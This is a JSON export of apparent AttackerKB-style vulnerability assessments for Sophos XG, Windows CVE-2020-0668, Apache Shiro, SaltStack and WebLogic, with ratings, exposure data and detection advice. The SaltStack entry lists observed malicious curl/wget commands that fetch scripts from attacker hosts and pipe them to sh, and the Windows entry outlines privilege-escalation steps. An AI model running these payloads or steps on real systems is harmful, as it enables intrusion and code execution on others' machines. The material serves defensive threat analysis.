SDK(s).\r\n\r\nEDIT: Attacker Value for this item largely depends on the type of device the vulnerable target is and behavior the device exhibits when successfully exploited.",
      "score": 1,
      "metadata": {
        "tags": [
          "default_configuration",
          "no_useful_data",
          "difficult_to_patch",
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "526d234e-4f5d-4601-8087-477bc7c485bd",
      "editorId": "d750dd2d-d52c-4e20-ac81-3f2046de7cc7",
      "topicId": "75221f03-cfa1-478e-9777-568e523e3272",
      "created": "2020-04-27T12:34:51.731963Z",
      "revisionDate": "2020-04-28T11:30:10.312574Z",
      "document": "### Vulnerability Rating/Info\r\n\r\nI based the value and exploitability off of the Sophos vulnerability details page: https://community.sophos.com/kb/en-us/135412 / https://web.archive.org/web/20200426003614/https://community.sophos.com/kb/en-us/135412\r\n\r\nSophos indicates attackers have been actively compromising these appliances at least as of April 22, 2020 when at least one customer noticed odd field values in their admin console. \r\n\r\nGiven that the SQL injection can happen pre-auth, and that both the user-facing and admin-facing interfaces are vulnerable, means this is a pretty severe bug.\r\n\r\nIt appears to only provide access to usernames and hashed appliance passwords. Credential reuse is likely the culprit for at least the known successful post-SQLi compromise.\r\n\r\n### Exposure Analysis\r\n\r\nWe found over 72,000 exposed appliances. Many appear to be service provider/telecom/ISP provisioned and sitting on customer segments.\r\n\r\nThe top 20 countries (IP geolocation) make up ~80% of the exposure:\r\n\r\n|country        |    n|pct    |\r\n|:--------------|----:|:------|\r\n|United States  | 9126|12.54% |\r\n|India          | 7989|10.98% |\r\n|Germany        | 5433|7.47%  |\r\n|Japan          | 4680|6.43%  |\r\n|Italy          | 4338|5.96%  |\r\n|Australia      | 4168|5.73%  |\r\n|Turkey         | 3740|5.14%  |\r\n|Brazil         | 3526|4.85%  |\r\n|France         | 2567|3.53%  |\r\n|United Kingdom | 1822|2.50%  |\r\n|South Africa   | 1779|2.44%  |\r\n|Canada         | 1658|2.28%  |\r\n|Spain          | 1644|2.26%  |\r\n|Malaysia       | 1496|2.06%  |\r\n|Switzerland    | 1261|1.73%  |\r\n|Colombia       | 1124|1.54%  |\r\n|Thailand       | 1087|1.49%  |\r\n|Netherlands    |  932|1.28%  |\r\n|Taiwan         |  681|0.94%  |\r\n|Portugal       |  611|0.84%  |\r\n\r\nThere are 2 primary externally facing HTTP paths:\r\n\r\n- Admin @ `https://{host|ip}:{port}/webconsole/webpages/login.jsp`\r\n- User @ `https://{host|ip}:{port}/userportal/webpages/myaccount/login.jsp`\r\n\r\nI crafted a quick hack study to just see if we could get version info and we can.  Sophos does the daft thing Microsoft does for OWA and refers to HTML resources by the version/build (e.g.):\r\n\r\n```\r\n<link rel=\"stylesheet\"\r\n      href=\"/themes/lite1/css/loginstylesheet.css?ver=17.5.9.577\"\r\n      type=\"text/css\">\r\n```\r\n\r\nI'll be doing a more thorough path study this week but we got back ~12,500 unique (by IP) responses. Here's the breakdown (TLDR there's a decent bit of exposure as of Sunday).\r\n\r\n```\r\n           Sophos XG Appliance Version Distribution                             \r\n           ~65,000   Appliances   Provided   Version   Details;                 \r\n           Only   ~25%   appear   to   be   patched   as   of   2020-04-27.     \r\n                                                                                \r\n                                                           # Sophos Appliances  \r\n           0~                  5,000                10,000                15,000\r\n5.01.0.376  x                     ~                     ~                     ~ \r\n5.01.0.407  x                     ~                     ~                     ~ \r\n5.01.0.418  x                     ~                     ~                     ~ \r\n5.01.0.447  x                     ~                     ~                     ~ \r\n6.01.0.190  x                     ~                     ~                     ~ \r\n6.01.1.202  xx                    ~                     ~                     ~ \r\n6.01.2.222  x                     ~                     ~                     ~ \r\n6.01.3.265  x                     ~                     ~                     ~ \r\n6.01.4.342  x                     ~                     ~                     ~ \r\n6.05.0.098  x                     ~                     ~                     ~ \r\n6.05.0.117  x                     ~                     ~                     ~ \r\n6.05.1.139  x                     ~                     ~                     ~ \r\n6.05.2.160  xx                    ~                     ~                     ~ \r\n6.05.3.183  x                     ~                     ~                     ~ \r\n6.05.5.233  xx                    ~                     ~                     ~ \r\n6.05.6.266  xx                    ~                     ~                     ~ \r\n6.05.7.305  xx                    ~                     ~                     ~ \r\n6.05.8.320  x                     ~                     ~                     ~ \r\n 17.0.0.32  x                     ~                     ~                     ~ \r\n 17.0.0.80  x                     ~                     ~                     ~ \r\n 17.0.1.98  x                     ~                     ~                     ~ \r\n17.0.2.116  xx                    ~                     ~                     ~ \r\n17.0.3.131  x                     ~                     ~                     ~ \r\n17.0.5.162  xx                    ~                     ~                     ~ \r\n17.0.6.181  xxxxx                 ~                     ~                     ~ \r\n17.0.7.191  xxxx                  ~                     ~                     ~ \r\n17.0.8.209  x                     ~                     ~                     ~ \r\n17.0.9.217  x                     ~                     ~                     ~ \r\n17.1.0.152  x                     ~                     ~                     ~ \r\n17.1.1.175  xx                    ~                     ~                     ~ \r\n17.1.2.225  xxxx                  ~                     ~                     ~ \r\n17.1.3.250  xxxxx                 ~                     ~                     ~ \r\n17.5.0.310  x                     ~                     ~                     ~ \r\n17.5.0.321  xxx                   ~                     ~                     ~ \r\n17.5.1.347  xxx                   ~                     ~                     ~ \r\n17.5.2.381  xxxxxxxxxxxxxxxxxxxxxxxxxx                  ~                     ~ \r\n17.5.3.372  x                     ~                     ~                     ~ \r\n17.5.4.429  xxxxxx                ~                     ~                     ~ \r\n17.5.5.433  xxxxxxxxx             ~                     ~                     ~ \r\n17.5.6.488  xxxxxx                ~                     ~                     ~ \r\n17.5.7.511  xxxxxxxxxxxxxxxxxxxxxxxxx                   ~                     ~ \r\n17.5.8.539  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx    ~ \r\n7.5.10.620  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx                   ~ \r\n7.5.11.661  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx    ~ \r\n18.0.0.102  x                     ~                     ~                     ~ \r\n18.0.0.113  x                     ~                     ~                     ~ \r\n18.0.0.180  x                     ~                     ~                     ~ \r\n18.0.0.285  x                     ~                     ~                     ~ \r\n18.0.0.321  xx                    ~                     ~                     ~ \r\n18.0.0.339  xxxxxx                ~                     ~                     ~ \r\n18.0.0.354  xx                    ~                     ~                     ~ \r\n18.0.1.368  x                     ~                     ~                     ~ \r\n            ~            Source: Rapid7 Project Sonar April 2020 HTTPS Studies~ \r\n```\r\n\r\nAs of 2020-04-28 ~25% appliances do not leave the \"auto-update hotfix\" setting on.\r\n\r\nOur blog on it: https://blog.rapid7.com/2020/04/27/cve-2020-12271-sophos-xg-firewall-pre-auth-sql-injection-vulnerability-remediation-guidance-and-exposure-overview/ | https://web.archive.org/web/20200428094002/https://blog.rapid7.com/2020/04/27/cve-2020-12271-sophos-xg-firewall-pre-auth-sql-injection-vulnerability-remediation-guidance-and-exposure-overview/",
      "score": 3,
      "metadata": {
        "tags": [
          "common_enterprise",
          "pre_auth"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "ea5921d4-6046-4a3b-963f-08e8bde1762a",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "13130520-c101-492f-a46d-2493829d51d8",
      "created": "2020-04-27T16:17:58.339312Z",
      "revisionDate": "2020-04-28T21:31:57.675181Z",
      "document": "This is a complex and poorly-defined vulnerability.  \r\nMicrosoft's description from https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0668 is essentially useless:\r\n\"An elevation of privilege vulnerability exists in the way that the Windows Kernel handles objects in memory. An attacker who successfully exploited the vulnerability could execute code with elevated permissions.  To exploit the vulnerability, a locally authenticated attacker could run a specially crafted application. \"\r\n\r\nThere is little surprise that there exists some confusion about the vulnerability.\r\n\r\nContrary to the earlier poster, I do not believe that this is a System Orchestrator bug.  I agree with https://packetstormsecurity.com/files/cve/CVE-2020-0668 and think the vulnerability is in the Remote Access Service.  Part of the confusion is that the vulnerability is a file overwrite vulnerability, and many PoCs are leveraging a dll-hijacking vulnerability in the system orchestrator service to gain code execution after the trusted file write takes place.\r\n\r\nThe Remote Access Service runs as system and creates a log of its actions called RASTAPI.LOG.  Once the RASTAPI.LOG reaches a defined size, the Remote Access Service copies RASTAPI.LOG to RASTAPI.OLD in the same directory.\r\nThe issue is twofold.  First, the behavior of the Remote Access Service Tool API is defined by three registry keys:\r\nHKLM\\SOFTWARE\\Microsoft\\Tracing\\RASTAPI\\EnableFileTracing\r\nHKLM\\SOFTWARE\\Microsoft\\Tracing\\RASTAPI\\FileDirectory\r\nHKLM\\SOFTWARE\\Microsoft\\Tracing\\RASTAPI\\new_size\r\nThese three registry keys allow a user to turn on the RASTAPI and configure the size and location of the log file.  These registry keys are writable by a regular user.\r\nThe second issue is that the RAST service performs only a trivial check on the filesystem location of the RASTAPI.OLD destination.  If an attacker creates a filesystem link  between the `old` log destination (i.e. C:\\users\\user\\temp\\RASTAPI.OLD) and a trusted location (C:\\windows\\system32\\badfile.dll), RASDIALER will copy the old log file to the linked location as the SYSTEM user.  Because there is a file hijacking vulnerability in the System Orchestrator service, many PoCs use the location C:\\Windows\\System32\\WindowsCoreDeviceInfo.dll, which does not exist in a default configuration, but System Orchestrator Service will load if it does exist, \r\n\r\nThe attack looks something like:\r\n1) Gain lower-privileged access to a vulnerable target.\r\n2) Create a dummy directory to hold files.\r\n3) Mount the dummy directory to \\RPC Control\r\n3) Upload a dll payload\r\n4) Create a link between \\RPC Control\\RASTAPI.LOG and the uploaded payload\r\n5) Create a link between \\RPC Control\\RASTAPI.OLD and the destination location the attacker would like to write (in this example, C:\\Windows\\system32\\WindowsCreDeviceInfo.dll)\r\n6) Write the registry keys to turn on FileTracing, set the file directory to the dummy directory, and set the max file size to one byte less than the size of the payload,\r\n7) Upload a configuration file for the rasdialer\r\n8) Launch the rasdialer.  When RAST service kicks off, it tries to write a log file to the directory specified in the registry, but it finds one already exists, and it is already full, so RAST service then copies the file to the \"old\" location that's linked to the trusted location.  The result is an arbitrary file write to a trusted location.\r\n9) At this point, the overwrite is complete.  PoC's leverage the System Orchestrator service to get execution of the overwritten dll file by launching the system orchestrator.\r\n\r\nMany PoC exploits leverage https://github.com/googleprojectzero/symboliclink-testing-tools which allow for the manipulation of symbolic links and mount points and also https://github.com/itm4n/UsoDllLoader to start the System Orchestrator service to launch the dll.\r\n\r\nWhile the exploit is difficult, there are several PoC exes out there, and a metasploit module in progress, so I consider the exploitability relatively easy, though the exploit itself is difficult.",
      "score": 10,
      "metadata": {
        "tags": [
          "post_auth",
          "common_enterprise",
          "default_configuration",
          "high_privilege_access"
        ],
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "9b3d47f1-fafe-460c-a03d-18ee594566cf",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "75221f03-cfa1-478e-9777-568e523e3272",
      "created": "2020-04-29T13:24:45.174546Z",
      "revisionDate": "2020-06-12T18:38:04.642288Z",
      "document": "The sophos subreddit reveals some insight on why these firewalls were listening on their WAN ports in the first place. In addition the the admin interface, there's a 'user portal' you can enabled, and even that may not be required for exploitation at least anecdotally:\r\n\r\nhttps://www.reddit.com/r/sophos/comments/g7x3n9/xg_firewall_vulnerability_notification_action/\r\nhttps://www.reddit.com/r/sophos/comments/g7tax1/sophos_xg_sql_injection_attack_kb135412_released/\r\n\r\nKind of a smart (and annoying for security analysis :) move for Sophos is they made getting the old software near impossible as soon as they found out about the problem. Contrast with Citrix, which [left vulnerable versions of Netscaler up](https://attackerkb.com/topics/x22buZozYJ/cve-2019-19781) in AWS and other locations available for download long after mass-exploitation had started. Handy for research, but a lot of folks also continued to be popped long after the info was public ",
      "score": 3,
      "metadata": {
        "tags": [
          "easy_to_develop",
          "default_configuration"
        ],
        "attacker-value": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "94983dca-cebc-4333-a7fa-2974a7e7ea0a",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "33fb495e-9243-4d86-8ad0-0edcb3c11224",
      "created": "2020-04-29T19:36:39.884015Z",
      "revisionDate": "2020-05-05T12:17:49.359047Z",
      "document": "Apache Shiro v1.2.4 is vulnerable to a Java deserialization vulnerability. An\r\nunauthenticated user can submit a YSoSerial payload to the Apache Shiro web\r\nserver as the value to the `rememberMe` cookie. This will result in code\r\nexecution in the context of the web server.\r\n\r\nThe YSoSerial `CommonsCollections2` payload is known to work and is the one\r\nleveraged by the Metasploit module.",
      "score": 4,
      "metadata": {
        "tags": [
          "default_configuration",
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "863e7bb1-4bff-4c03-be47-35d05047ce74",
      "editorId": "ae2a07aa-bedc-4a79-99a2-bfe56f30b295",
      "topicId": "c964b102-c1a8-42e7-ae93-2d5fcbad769c",
      "created": "2020-04-30T23:57:11.544289Z",
      "revisionDate": "2020-05-06T14:00:10.301641Z",
      "document": "Version 2019.2.3 or less is vulnerable. Easy to exploit.\r\n\"Exploitation\r\n\r\nWe expect that any competent hacker will be able to create 100% reliable exploits for these issues in under 24 hours. Due to reliability and simplicity of exploitation, F-Secure will not be providing proof-of-concept exploit code as this would only harm any users who are slow to patch. In this case, we will leave exploitation as an exercise for the reader.\"\r\nhttps://labs.f-secure.com/advisories/saltstack-authorization-bypass\r\n\r\nTestcase to be able to reverse and develop exploit for this RCE\r\nhttps://github.com/saltstack/salt/blob/3d99b108c58ebaa174967d898a27764f416a8ec1/tests/integration/master/test_clear_funcs.py\r\n",
      "score": 4,
      "metadata": {},
      "tags": []
    },
    {
      "id": "2a661b18-d7a5-4332-8441-39f3281bffdc",
      "editorId": "7ff62803-e0a8-4121-b324-d4afe9f60d43",
      "topicId": "c964b102-c1a8-42e7-ae93-2d5fcbad769c",
      "created": "2020-05-01T20:19:57.221069Z",
      "revisionDate": "2020-07-10T13:25:45.064933Z",
      "document": "#### Overview\r\nFor Salt Master before 2019.2.4 and 3000 before 3000.2 there is potential for RCE as root.\r\n\r\nIf a salt-master has its ZeroMQ ports `4506` exposed to the public it is possible for an unauthenticated user to gain access to the root_key. With access to the root key it is possible to run a wide range of salt commands that include file read, file write and command execution. These commands can be executed on the salt-master and any minion that is connected. \r\n\r\nThis requires multiple socket requests. one to read the key and then additional requests to create jobs. \r\n\r\n#### Proof Of Concept\r\n\r\nThis POC was tested on SaltStack 2019.2.0\r\n\r\nAs of the time of writing this assessment I have been able to create a functional exploit POC. The Code can be found here - https://github.com/kevthehermit/CVE-2020-11651\r\n\r\nThe POC and others I am sure will appear shortly has the following functionality\r\n\r\n- Read the root key\r\n- Read and Write files on the Salt Master\r\n- Construct a payload to gain full RCE as root on any connected Minion\r\n\r\nThis took several hours and is \"easy\" with the available information and access to a test instance.  Details on the discovery process can be found on our blog - https://immersivelabs.com/2020/05/06/hackers-are-currently-attacking-vulnerable-saltstack-systems/\r\n\r\n#### Mitigations:\r\n\r\nPatch to the latest versions and do not expose theses ports to the external network. \r\n\r\n#### Detections\r\n\r\nexamine `/var/cache/salt/master/jobs/` on the salt master for a listing of all jobs. the `return.p` file in these dirs will contain a detailed description of the request and the response. This data is serialised.\r\n\r\n\r\nImmersive Labs have released a basic python script to parse all these job files - https://immersivelabs.com/2020/05/06/how-to-lock-onto-the-hackers-targeting-saltstack-minions/\r\n\r\n```bash\r\n# cat /var/cache/salt/master/jobs/65/6e5fa0837ca5f3d391c4d70d345ee25baed089b970a78a934709e80d083f95/7a5388b6a882_master/return.p\r\n\ufffd\ufffdreturn\ufffd\ufffdfun\ufffdwheel.file_roots.read\ufffdjid\ufffd20200501195107225222\ufffduser\ufffdUNKNOWN\ufffdfun_args\ufffd\ufffd../../../../etc/shadow\ufffd\ufffdsaltenv\ufffdbase\ufffd_stamp\ufffd2020-05-01T19:51:07.229260\ufffdreturn\ufffd\ufffd\ufffd /srv/salt/../../../../etc/shadow\ufffd\ufffdroot:!::0:::::\r\nbin:!::0:::::\r\ndaemon:!::0:::::\r\nadm:!::0:::::\r\nlp:!::0:::::\r\nsync:!::0:::::\r\nshutdown:!::0:::::\r\nhalt:!::0:::::\r\nmail:!::0:::::\r\nnews:!::0:::::\r\nuucp:!::0:::::\r\noperator:!::0:::::\r\nman:!::0:::::\r\npostmaster:!::0:::::\r\ncron:!::0:::::\r\nftp:!::0:::::\r\nsshd:!::0:::::\r\nat:!::0:::::\r\nsquid:!::0:::::\r\nxfs:!::0:::::\r\ngames:!::0:::::\r\npostgres:!::0:::::\r\ncyrus:!::0:::::\r\nvpopmail:!::0:::::\r\nntp:!::0:::::\r\nsmmsp:!::0:::::\r\nguest:!::0:::::\r\nnobody:!::0:::::\r\nsalt:!:18164:0:99999:7:::\r\n\r\n```\r\n\r\nSnort Rule:\r\n\r\n`alert tcp $EXTERNAL_NET any -> $HOME_NET 4506 (msg:\"Salt Stack root_key read attempt\"; content:\"_prep_auth_info\"; sid:1000000; rev:1;)`\r\n\r\nOn the wire it looks a bit like this so a stronger rule can be created \r\n`b'\\x82\\xa3enc\\xa5clear\\xa4load\\x81\\xa3cmd\\xaf_prep_auth_info' `\r\n\r\n\r\n#### In the wild\r\n\r\nThe following IPS have been observed sending malicious payloads. other IPS have been seen scanning. \r\n\r\n- 95.181.178.108\r\n- 89.151.132.112\r\n- 89.27.255.58\r\n- 104.244.76.189\r\n- 95.213.139.92\r\n- 81.92.218.74\r\n- 178.44.87.133\r\n\r\n\r\n#### Payloads\r\n\r\nThe following Payloads have been observed\r\n\r\n- `(curl -s 95.142.44.216/sa.sh||wget -q -O- 95.142.44.216/sa.sh)|sh`\r\n- `import subprocess;subprocess.call(\\\"(curl -s 95.142.44.216/sa.sh||wget -q -O- 95.142.44.216/sa.sh)|sh\\\",shell=True)`\r\n- `/bin/sh -c '(wget -qO- -t3 -w1 -T10 --no-http-keep-alive http://94.253.90.22:44444/ || curl -fs --connect-timeout 5 -m10 --retry 3 http://94.253.90.22:44444/)|sh  -s -- 94.253.90.22:44445 G9/kjA/vdOSlUG3q+lz6DZwzr0rgiNWRfbb2UZcnYgmUY01gHW5tQrS6SgjiN/6doZfjvmc='`\r\n- `(curl -s anagima3.top/sa.sh||wget -q -O- anagima3.top/sa.sh)|sh`\r\n- `(curl -s 95.142.44.216/sa.sh||wget -q -O- 95.142.44.216/sa.sh)|sh`\r\n- `(curl -s 176.104.3.35/?6920||wget -q -O- 176.104.3.35/?6920)|sh`\r\n- `/bin/sh -c 'wget -qO- -t3 -w1 -T10 --no-http-keep-alive http://217.25.227.174:44444/?i=[redacted_ip]`\r\n\r\n\r\n\r\n\r\n\r\n\r\n",
      "score": 10,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "pre_auth",
          "common_enterprise",
          "easy_to_develop",
          "default_configuration"
        ],
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "19c5ea09-7e44-4e8f-a01c-1c52ec63f327",
      "editorId": "d750dd2d-d52c-4e20-ac81-3f2046de7cc7",
      "topicId": "255908b4-ba2b-4575-84e5-63690a0110ae",
      "created": "2020-05-02T00:18:10.403405Z",
      "revisionDate": "2020-05-15T19:15:42.891539Z",
      "document": "Well, it's bad when even _Oracle_ decides to [raise the alarm bells](https://blogs.oracle.com/security/apply-april-2020-cpu) (wayback machine was down, so no permalink yet) about it.\r\n\r\nThey've detected active exploitation attempts against WebLogic servers.\r\n\r\nT3 is Weblogic's proprietary implementation of the RMI spec and is primarily used as a layer to enable JNDI calls by apps/clients.\r\n\r\nIt appears there's [PoC for it](https://github.com/hktalent/CVE_2020_2546) but I haven't tested it yet. Since it's yet-another deserialization vulnerability and there's existing PoC code for similar RMI RCE, Oracle's observations are likely correct.\r\n\r\n\r\n",
      "score": 3,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "pre_auth"
        ]
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    }
  ]
}